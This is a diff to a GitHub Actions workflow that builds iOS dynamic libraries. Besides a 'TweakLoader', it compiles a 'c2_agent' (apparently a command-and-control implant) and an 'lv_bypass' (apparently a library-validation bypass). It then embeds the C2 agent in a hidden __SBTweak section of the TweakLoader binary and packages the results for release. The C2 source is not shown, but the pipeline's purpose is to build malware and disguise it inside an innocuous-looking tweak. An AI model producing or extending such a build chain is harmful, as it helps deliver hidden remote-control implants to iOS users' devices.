@@ -1,21 +1,130 @@
-- name: Build TweakLoader (iOS)
-  run: |
-    echo "=== Building TweakLoader.dylib for iOS ==="
+name: Build TweakLoader + C2 Agent
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: macos-14
     
-    clang -arch arm64 \
-      -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-      -mios-version-min=15.0 \
-      -fmodules \
-      -dynamiclib \
-      -framework Foundation \
-      -framework UIKit \
-      -o TweakLoader_ios.dylib \
-      TweakLoader.m
-    
-    if [ $? -eq 0 ]; then
-      echo "[✓] Built successfully"
-      file TweakLoader_ios.dylib
-    else
-      echo "[!] Build failed"
-      exit 1
-    fi
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Setup Environment
+      run: |
+        echo "=== Setup ==="
+        echo "Project files:"
+        ls -la
+
+    - name: Build TweakLoader (iOS)
+      run: |
+        echo "=== Building TweakLoader.dylib for iOS ==="
+        
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -fmodules \
+          -dynamiclib \
+          -framework Foundation \
+          -framework UIKit \
+          -o TweakLoader_ios.dylib \
+          TweakLoader.m
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] Built successfully"
+          file TweakLoader_ios.dylib
+        else
+          echo "[!] Build failed"
+          exit 1
+        fi
+
+    - name: Build C2 Agent (iOS)
+      run: |
+        echo "=== Building c2_agent.dylib for iOS ==="
+        
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -fmodules \
+          -dynamiclib \
+          -framework Foundation \
+          -o c2_agent_ios.dylib \
+          c2_agent.c
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] Built successfully"
+          file c2_agent_ios.dylib
+        fi
+
+    - name: Build LV Bypass (iOS)
+      run: |
+        echo "=== Building lv_bypass.dylib for iOS ==="
+        
+        clang -arch arm64 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -mios-version-min=15.0 \
+          -fmodules \
+          -dynamiclib \
+          -framework Foundation \
+          -o lv_bypass_ios.dylib \
+          lv_bypass.c
+        
+        if [ $? -eq 0 ]; then
+          echo "[✓] Built successfully"
+          file lv_bypass_ios.dylib
+        fi
+
+    - name: Create Embedded Payload
+      run: |
+        echo "=== Creating Embedded Payload ==="
+        
+        if [ -f "TweakLoader_ios.dylib" ] && [ -f "c2_agent_ios.dylib" ]; then
+          ld -r \
+            -sectcreate __TEXT __SBTweak c2_agent_ios.dylib \
+            -o TweakLoader_embedded.o \
+            TweakLoader_ios.dylib
+          
+          clang -arch arm64 \
+            -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+            -mios-version-min=15.0 \
+            -dynamiclib \
+            -framework Foundation \
+            -o TweakLoader_final.dylib \
+            TweakLoader_embedded.o
+          
+          echo "[✓] TweakLoader_final.dylib created"
+          file TweakLoader_final.dylib
+        else
+          echo "[!] Missing input files"
+        fi
+
+    - name: Package Artifacts
+      run: |
+        echo "=== Packaging ==="
+        mkdir -p release
+        
+        cp TweakLoader_ios.dylib release/ 2>/dev/null || true
+        cp c2_agent_ios.dylib release/ 2>/dev/null || true
+        cp lv_bypass_ios.dylib release/ 2>/dev/null || true
+        cp TweakLoader_final.dylib release/ 2>/dev/null || true
+        
+        echo "=== Release Contents ==="
+        ls -la release/
+        
+        cd release && zip -r ../tweakloader-release.zip . && cd ..
+
+    - name: Upload Artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: tweakloader-build
+        path: |
+          *.dylib
+          *.o
+          release/
+          tweakloader-release.zip
+        retention-days: 30
